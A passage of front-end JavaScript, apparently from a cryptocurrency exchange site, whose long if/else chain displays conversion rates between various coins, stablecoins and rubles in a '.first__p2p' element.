                        document.querySelector('.first__p2p').textContent = `1 BTC = ${ addedSpacesInNumbers( (Number(PRICE_BTC) / Number(PRICE_SOL)).toFixed(2) ) } SOL`;
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BTC = ${ addedSpacesInNumbers( Number(PRICE_BTC) / Number(PRICE_POL) ) } POL`;
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BTC = ${ addedSpacesInNumbers( (Number(PRICE_BTC) / Number(PRICE_ETH)).toFixed(2) ) } ETH`;
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BTC = ${ addedSpacesInNumbers( (Number(PRICE_BTC) / Number(PRICE_ARB)).toFixed(2) ) } ARB`;
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BTC = ${ addedSpacesInNumbers( (Number(PRICE_BTC) / Number(PRICE_LTC)).toFixed(2) ) } LTC`;
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BTC = ${ addedSpacesInNumbers( (Number(PRICE_BTC) / Number(PRICE_BCH)).toFixed(2) ) } BCH`;
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BTC = ${ addedSpacesInNumbers( (Number(PRICE_BTC) / Number(PRICE_XRP)).toFixed(2) ) } XRP`;
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BTC = ${ addedSpacesInNumbers( (Number(PRICE_BTC) / Number(PRICE_DOGE)).toFixed(2) ) } DOGE`;
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BTC = ${ addedSpacesInNumbers( (Number(PRICE_BTC) / Number(PRICE_ETC)).toFixed(2) ) } ETC`;
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BTC = ${ addedSpacesInNumbers( (Number(PRICE_BTC) / Number(PRICE_XLM)).toFixed(2) ) } XLM`;
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BTC = ${ addedSpacesInNumbers( (Number(PRICE_BTC) / Number(PRICE_TRX)).toFixed(2) ) } TRX`;
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BTC = ${ addedSpacesInNumbers( (Number(PRICE_BTC) / Number(PRICE_TON)).toFixed(2) ) } TON`;
                    } else if ( valuteSecondName == 'Dash (DASH)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BTC = ${ addedSpacesInNumbers( (Number(PRICE_BTC) / Number(PRICE_DASH)).toFixed(2) ) } DASH`;
                    } else if ( valuteSecondName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BTC = ${ addedSpacesInNumbers( (Number(PRICE_BTC) / Number(PRICE_ZEC)).toFixed(2) ) } ZEC`;
                    } else if ( valuteSecondName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BTC = ${ addedSpacesInNumbers( (Number(PRICE_BTC) / Number(PRICE_BNB)).toFixed(2) ) } BNB`;
                    } else if ( valuteSecondName == 'Monero (XMR)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BTC = ${ addedSpacesInNumbers( (Number(PRICE_BTC) / Number(PRICE_XMR)).toFixed(2) ) } XMR`;
                    }

                } else if ( valuteFirstName == 'Tether ERC20 (USDT)' || valuteFirstName == 'Tether TRC20 (USDT)' || valuteFirstName == 'Tether BEP20 (USDT)' || valuteFirstName == 'Tether SOL (USDT)' || valuteFirstName == 'Tether TON (USDT)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        // document.querySelector('.first__p2p').textContent = `1 USDT = ${ Number(PRICE_USDT * data.Valute.USD.Value).toFixed(2) } RUB`;
                        document.querySelector('.first__p2p').textContent = `1 USDT = ${ addedSpacesInNumbers(( PRICE_USDT * data.Valute.USD.Value )) } RUB`;
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BTC) ) } USDT = 1 BTC`;
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__p2p').textContent = `1 USDT = ${PRICE_USDT} USDT`;
                    } else if ( valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__p2p').textContent = `1 USDT = ${PRICE_USDC} USDC`;
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__p2p').textContent = `1 USDT = ${PRICE_DAI} DAI`;
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__p2p').textContent = `${PRICE_DOT} USDT = 1 DOT`;
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__p2p').textContent = `${PRICE_SOL} USDT = 1 SOL`;
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__p2p').textContent = `${PRICE_POL} USDT = 1 POL`;
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_ETH)} USDT = 1 ETH`;
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_ARB)} USDT = 1 ARB`;
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_LTC)} USDT = 1 LTC`;
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_BCH)} USDT = 1 BCH`;
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_XRP)} USDT = 1 XRP`;
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_DOGE)} USDT = 1 DOGE`;
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_ETC)} USDT = 1 ETC`;
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_XLM)} USDT = 1 XLM`;
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_TRX)} USDT = 1 TRX`;
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_TON)} USDT = 1 TON`;
                    } else if (valuteSecondName == 'Dash (DASH)') {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_DASH)} USDT = 1 DASH`;
                    } else if (valuteSecondName == 'Zcash (ZEC)') {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_ZEC)} USDT = 1 ZEC`;
                    } else if (valuteSecondName == 'Binance Coin (BNB BEP20)') {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_BNB)} USDT = 1 BNB`;
                    } else if (valuteSecondName == 'Monero (XMR)') {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_XMR)} USDT = 1 XMR`;
                    }


                } else if ( valuteFirstName == 'USD Coin ERC20 (USDC)' || valuteFirstName == 'USD Coin SOL (USDC)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        // document.querySelector('.first__p2p').textContent = `1 USDC = ${ addedSpacesInNumbers(( data.Valute.USD.Value).toFixed(2)) } RUB`;
                        document.querySelector('.first__p2p').textContent = `1 USDC = ${ addedSpacesInNumbers(( PRICE_USDC * data.Valute.USD.Value )) } RUB`;
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BTC) ) } USDC = 1 BTC`;
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__p2p').textContent = `1 USDC = ${PRICE_USDT} USDT`;
                    } else if ( valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__p2p').textContent = `1 USDC = ${PRICE_USDC} USDC`;
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__p2p').textContent = `1 USDC = ${PRICE_DAI} DAI`;
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__p2p').textContent = `${PRICE_DOT} USDC = 1 DOT`;
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__p2p').textContent = `${PRICE_SOL} USDC = 1 SOL`;
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__p2p').textContent = `${PRICE_POL} USDC = 1 POL`;
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_ETH)} USDC = 1 ETH`;
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_ARB)} USDC = 1 ARB`;
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_LTC)} USDC = 1 LTC`;
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_BCH)} USDC = 1 BCH`;
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_XRP)} USDC = 1 XRP`;
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_DOGE)} USDC = 1 DOGE`;
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_ETC)} USDC = 1 ETC`;
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_XLM)} USDC = 1 XLM`;
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_TRX)} USDC = 1 TRX`;
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_TON)} USDC = 1 TON`;
                    } else if (valuteSecondName == 'Dash (DASH)') {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_DASH)} USDC = 1 DASH`;
                    } else if (valuteSecondName == 'Zcash (ZEC)') {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_ZEC)} USDC = 1 ZEC`;
                    } else if (valuteSecondName == 'Binance Coin (BNB BEP20)') {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_BNB)} USDC = 1 BNB`;
                    } else if (valuteSecondName == 'Monero (XMR)') {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_XMR)} USDC = 1 XMR`;
                    }

                } else if ( valuteFirstName == 'Dai (DAI)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        // document.querySelector('.first__p2p').textContent = `1 DAI = ${ addedSpacesInNumbers(( data.Valute.USD.Value).toFixed(2)) } RUB`;
                        document.querySelector('.first__p2p').textContent = `1 DAI = ${ addedSpacesInNumbers(( PRICE_DAI * data.Valute.USD.Value )) } RUB`;
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BTC) ) } DAI = 1 BTC`;
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DAI = ${PRICE_USDT} USDT`;
                    } else if ( valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DAI = ${PRICE_USDC} USDC`;
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DAI = ${PRICE_DAI} DAI`;
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__p2p').textContent = `${PRICE_DOT} DAI = 1 DOT`;
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__p2p').textContent = `${PRICE_SOL} DAI = 1 SOL`;
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__p2p').textContent = `${PRICE_POL} DAI = 1 POL`;
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_ETH)} DAI = 1 ETH`;
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_ARB)} DAI = 1 ARB`;
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_LTC)} DAI = 1 LTC`;
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_BCH)} DAI = 1 BCH`;
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_XRP)} DAI = 1 XRP`;
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_DOGE)} DAI = 1 DOGE`;
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_ETC)} DAI = 1 ETC`;
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_XLM)} DAI = 1 XLM`;
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_TRX)} DAI = 1 TRX`;
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_TON)} DAI = 1 TON`;
                    } else if (valuteSecondName == 'Dash (DASH)') {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_DASH)} DAI = 1 DASH`;
                    } else if (valuteSecondName == 'Zcash (ZEC)') {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_ZEC)} DAI = 1 ZEC`;
                    } else if (valuteSecondName == 'Binance Coin (BNB BEP20)') {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_BNB)} DAI = 1 BNB`;
                    } else if (valuteSecondName == 'Monero (XMR)') {
                        document.querySelector('.first__p2p').textContent = `${addedSpacesInNumbers(PRICE_XMR)} DAI = 1 XMR`;
                    }

                } else if ( valuteFirstName == 'Polkadot (DOT)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__p2p').textContent = `1 DOT = ${ addedSpacesInNumbers((PRICE_DOT * data.Valute.USD.Value).toFixed(2)) } RUB`;
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BTC) / Number(PRICE_DOT) ) } DOT = 1 BTC`;
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DOT = ${ addedSpacesInNumbers( Number(PRICE_DOT) / Number(PRICE_USDT) ) } USDT`;
                    } else if ( valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DOT = ${ addedSpacesInNumbers( Number(PRICE_DOT) / Number(PRICE_USDC) ) } USDC`;
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DOT = ${ addedSpacesInNumbers( Number(PRICE_DOT) / Number(PRICE_DAI) ) } DAI`;
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DOT = ${ addedSpacesInNumbers( Number(PRICE_DOT) / Number(PRICE_DOT) ) } DOT`;
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_SOL) / Number(PRICE_DOT) ) } DOT = 1 SOL`;
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DOT = ${ addedSpacesInNumbers( Number(PRICE_DOT) / Number(PRICE_POL) ) } POL`;
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_ETH) / Number(PRICE_DOT) ) } DOT = 1 ETH`;
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DOT = ${ addedSpacesInNumbers( (Number(PRICE_DOT) / Number(PRICE_ARB)).toFixed(2) ) } ARB`;
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_LTC) / Number(PRICE_DOT) ) } DOT = 1 LTC`;
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BCH) / Number(PRICE_DOT) ) } DOT = 1 BCH`;
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DOT = ${ addedSpacesInNumbers( (Number(PRICE_DOT) / Number(PRICE_XRP)).toFixed(2) ) } XRP`;
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DOT = ${ addedSpacesInNumbers( (Number(PRICE_DOT) / Number(PRICE_DOGE)).toFixed(2) ) } DOGE`;
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DOT = ${ addedSpacesInNumbers( (Number(PRICE_DOT) / Number(PRICE_ETC)).toFixed(2) ) } ETC`;
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DOT = ${ addedSpacesInNumbers( (Number(PRICE_DOT) / Number(PRICE_XLM)).toFixed(2) ) } XLM`;
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DOT = ${ addedSpacesInNumbers( (Number(PRICE_DOT) / Number(PRICE_TRX)).toFixed(2) ) } TRX`;
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DOT = ${ addedSpacesInNumbers( (Number(PRICE_DOT) / Number(PRICE_TON)).toFixed(2) ) } TON`;
                    } else if (valuteSecondName == 'Dash (DASH)') {
                        document.querySelector('.first__p2p').textContent = `1 DOT = ${addedSpacesInNumbers((Number(PRICE_DOT) / Number(PRICE_DASH)).toFixed(2))} DASH`;
                    } else if (valuteSecondName == 'Zcash (ZEC)') {
                        document.querySelector('.first__p2p').textContent = `1 DOT = ${((Number(PRICE_DOT) / Number(PRICE_ZEC)).toFixed(5))} ZEC`;
                    } else if (valuteSecondName == 'Binance Coin (BNB BEP20)') {
                        document.querySelector('.first__p2p').textContent = `1 DOT = ${((Number(PRICE_DOT) / Number(PRICE_BNB)).toFixed(5))} BNB`;
                    } else if (valuteSecondName == 'Monero (XMR)') {
                        document.querySelector('.first__p2p').textContent = `1 DOT = ${((Number(PRICE_DOT) / Number(PRICE_XMR)).toFixed(5))} XMR`;
                    }


                } else if ( valuteFirstName == 'Solana (SOL)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__p2p').textContent = `1 SOL = ${ addedSpacesInNumbers((PRICE_SOL * data.Valute.USD.Value).toFixed(2)) } RUB`;
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BTC) / Number(PRICE_SOL) ) } SOL = 1 BTC`;
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__p2p').textContent = `1 SOL = ${ addedSpacesInNumbers( Number(PRICE_SOL) / Number(PRICE_USDT) ) } USDT`;
                    } else if ( valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__p2p').textContent = `1 SOL = ${ addedSpacesInNumbers( Number(PRICE_SOL) / Number(PRICE_USDC) ) } USDC`;
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__p2p').textContent = `1 SOL = ${ addedSpacesInNumbers( Number(PRICE_SOL) / Number(PRICE_DAI) ) } DAI`;
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__p2p').textContent = `1 SOL = ${ addedSpacesInNumbers( Number(PRICE_SOL) / Number(PRICE_DOT) ) } DOT`;
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_SOL) / Number(PRICE_SOL) ) } SOL = 1 SOL`;
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__p2p').textContent = `1 SOL = ${ addedSpacesInNumbers( Number(PRICE_SOL) / Number(PRICE_POL) ) } POL`;
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_ETH) / Number(PRICE_SOL) ) } SOL = 1 ETH`;
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__p2p').textContent = `1 SOL = ${ addedSpacesInNumbers( (Number(PRICE_SOL) / Number(PRICE_ARB)).toFixed(2) ) } ARB`;
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_LTC) / Number(PRICE_SOL) ) } SOL = 1 LTC`;
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BCH) / Number(PRICE_SOL) ) } SOL = 1 BCH`;
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__p2p').textContent = `1 SOL = ${ addedSpacesInNumbers( (Number(PRICE_SOL) / Number(PRICE_XRP)).toFixed(2) ) } XRP`;
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__p2p').textContent = `1 SOL = ${ addedSpacesInNumbers( (Number(PRICE_SOL) / Number(PRICE_DOGE)).toFixed(2) ) } DOGE`;
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__p2p').textContent = `1 SOL = ${ addedSpacesInNumbers( (Number(PRICE_SOL) / Number(PRICE_ETC)).toFixed(2) ) } ETC`;
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__p2p').textContent = `1 SOL = ${ addedSpacesInNumbers( (Number(PRICE_SOL) / Number(PRICE_XLM)).toFixed(2) ) } XLM`;
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__p2p').textContent = `1 SOL = ${ addedSpacesInNumbers( (Number(PRICE_SOL) / Number(PRICE_TRX)).toFixed(2) ) } TRX`;
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__p2p').textContent = `1 SOL = ${ addedSpacesInNumbers( (Number(PRICE_SOL) / Number(PRICE_TON)).toFixed(2) ) } TON`;
                    } else if (valuteSecondName == 'Dash (DASH)') {
                        document.querySelector('.first__p2p').textContent = `1 SOL = ${addedSpacesInNumbers((Number(PRICE_SOL) / Number(PRICE_DASH)).toFixed(2))} DASH`;
                    } else if (valuteSecondName == 'Zcash (ZEC)') {
                        document.querySelector('.first__p2p').textContent = `1 SOL = ${addedSpacesInNumbers((Number(PRICE_SOL) / Number(PRICE_ZEC)).toFixed(2))} ZEC`;
                    } else if (valuteSecondName == 'Binance Coin (BNB BEP20)') {
                        document.querySelector('.first__p2p').textContent = `1 SOL = ${addedSpacesInNumbers((Number(PRICE_SOL) / Number(PRICE_BNB)).toFixed(2))} BNB`;
                    } else if (valuteSecondName == 'Monero (XMR)') {
                        document.querySelector('.first__p2p').textContent = `1 SOL = ${addedSpacesInNumbers((Number(PRICE_SOL) / Number(PRICE_XMR)).toFixed(2))} XMR`;
                    }


                } else if ( valuteFirstName == 'Polygon (POL)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__p2p').textContent = `1 POL = ${ addedSpacesInNumbers((PRICE_POL * data.Valute.USD.Value).toFixed(2)) } RUB`;
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BTC) / Number(PRICE_POL) ) } POL = 1 BTC`;
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__p2p').textContent = `1 POL = ${ addedSpacesInNumbers( Number(PRICE_POL) / Number(PRICE_USDT) ) } USDT`;
                    } else if ( valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__p2p').textContent = `1 POL = ${ addedSpacesInNumbers( Number(PRICE_POL) / Number(PRICE_USDC) ) } USDC`;
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__p2p').textContent = `1 POL = ${ addedSpacesInNumbers( Number(PRICE_POL) / Number(PRICE_DAI) ) } DAI`;
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_DOT) / Number(PRICE_POL) ) } POL = 1 DOT`;
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_SOL) / Number(PRICE_POL) ) } POL = 1 SOL`;
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__p2p').textContent = `1 POL = ${ addedSpacesInNumbers( Number(PRICE_POL) / Number(PRICE_POL) ) } POL`;
